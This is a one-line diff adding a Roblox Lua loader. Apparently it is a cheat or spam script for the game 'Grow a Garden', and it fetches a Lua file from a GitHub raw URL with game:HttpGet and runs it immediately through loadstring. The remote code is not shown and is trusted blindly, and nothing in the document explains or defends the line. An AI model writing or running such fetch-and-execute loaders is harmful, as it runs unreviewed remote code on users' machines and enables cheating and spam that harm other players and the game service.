@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/grow-a-garden-spam1-x6xec20ogzuy3j.lua"))()
